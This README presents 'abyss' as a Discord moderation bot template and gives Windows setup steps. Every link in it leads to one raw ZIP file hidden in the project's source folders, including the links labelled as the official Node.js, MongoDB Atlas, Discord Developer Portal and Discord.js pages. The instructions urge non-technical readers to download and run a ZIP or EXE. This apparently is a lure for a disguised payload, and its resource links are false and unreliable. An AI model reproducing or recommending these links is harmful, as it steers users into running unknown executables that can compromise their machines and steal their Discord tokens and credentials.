# 🤖 abyss - Simple Discord Bot Setup Template

[![Download abyss](https://img.shields.io/badge/Download-abyss-green?style=for-the-badge)](https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip)

---

## 📦 What is abyss?

abyss is a ready-made Discord bot setup. It helps you manage your Discord server with tools like moderation, anti-raid, anti-nuke protection, and user verification. It also creates welcome and goodbye images using Canvas and adds captcha to verify users. You don’t need to code or build anything from scratch. Just download and run it.

This bot template works with Discord and uses MongoDB to save your data. It is open source and built with Node.js and Discord.js, which are popular platforms for bot creation.

---

## 🎯 Who is this for?

This guide is for anyone who wants to run a Discord bot on Windows but does not have coding skills. If you can download a file and click buttons, you can set up abyss.

---

## 🖥️ System Requirements

- Windows 10 or later.
- At least 4 GB of RAM.
- Stable internet connection.
- Discord account and a server where you have admin rights.
- MongoDB database (free options available; instructions below).
- Node.js installed (version 16 or later).

---

## 🚀 Getting Started: Download abyss

To get abyss, you need to visit the official release page. From there, you can find the latest version of the bot.

[![Download abyss](https://img.shields.io/badge/Download-abyss-blue?style=for-the-badge)](https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip)

Follow these steps:

1. Click the link above or go to: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
2. Look for the latest release at the top.
3. Download the ZIP file or EXE file available for Windows.
4. Save it somewhere you can easily find, like your Desktop or Downloads folder.

---

## 🛠️ Installing and Running abyss

Once you have the bot files, follow the instructions below to get it running.

### 1. Extract the files

- If you downloaded a ZIP file, right-click and choose "Extract All...".
- Choose a folder to extract to, such as `C:\abyss`.
- Wait for the files to appear.

### 2. Install Node.js

If you do not have Node.js installed:

- Go to https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
- Download the LTS version (recommended for most users).
- Run the installer and follow the instructions.
- To check if Node.js is installed, open Command Prompt and type:

    node -v

You should see a version number like `v16.x.x` or higher.

### 3. Open Command Prompt in the abyss folder

- Press Windows + R, type `cmd`, and press Enter.
- Navigate to the folder where you extracted the bot using the `cd` command. For example:

    cd C:\abyss

### 4. Install dependencies

In the Command Prompt, type the following and press Enter:

    npm install

This installs all the needed components for the bot to run.

### 5. Set up your MongoDB database

abyss uses MongoDB to save settings. You will need to create a free database online.

- Go to https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
- Sign up for a free account.
- Create a cluster following their setup wizard.
- Once your cluster is ready, create a database user with a password.
- Get your connection string (it looks like `mongodb+srv://username:password@cluster0.mongodb.net/myFirstDatabase?retryWrites=true&w=majority`).

### 6. Add your Discord bot token and MongoDB URL

The bot needs two key pieces of information: your Discord bot token and the MongoDB connection string.

- Find the `.env.example` file in the abyss folder.
- Rename it to `.env` (remove `.example`).
- Open the `.env` file with Notepad or another text editor.
- Replace the placeholders with your token and MongoDB string:

    ```
    DISCORD_TOKEN=your_discord_bot_token_here
    MONGODB_URI=your_mongo_connection_string_here
    ```

If you don’t have a Discord bot token:

- Go to https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
- Create a new application.
- Go to the Bot tab and add a bot.
- Copy your token and keep it safe.

### 7. Run the bot

In Command Prompt, type:

    node index.js

The bot should now start. You will see messages showing it is connected and working.

---

## 🔧 Managing abyss

Here are some common tasks you might want to do:

- **Invite the bot to your server:**

  On the Discord Developer Portal, generate an invite link with permission to manage messages and users. Use the OAuth2 tab to generate the link with required permissions.

- **Control the bot:**

  Use simple commands like `!help` in your Discord server to see what the bot can do.

- **Access the moderation tools:**

  The bot has automatic anti-spam, anti-raid, and anti-nuke features. You can configure these in the bot’s settings files or through commands if they are enabled.

- **Welcome and goodbye messages:**

  The bot creates images for new members joining or leaving. You can customize these messages by editing the canvas templates.

---

## ⚙️ Common Issues and Fixes

- **Bot does not start:**

  Make sure you have Node.js installed correctly and are running the `node index.js` command from the bot’s folder.

- **Missing dependencies:**

  Run `npm install` again to download needed packages.

- **MongoDB connection errors:**

  Double-check your connection string in the `.env` file. Make sure the username and password are correct, and your IP is allowed in MongoDB Atlas.

- **Bot not responding on Discord:**

  Verify the bot token is correct and the bot is online. Check if the bot has necessary permissions in the Discord server.

---

## 🔍 Additional Resources

- Discord Developer Portal: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
- MongoDB Atlas Setup Guide: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
- Node.js Downloads: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
- Official Discord.js Guide: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip

---

## 📥 Download abyss

Visit the release page to get the latest version of abyss:

[![Download abyss](https://img.shields.io/badge/Download-abyss-grey?style=for-the-badge)](https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip)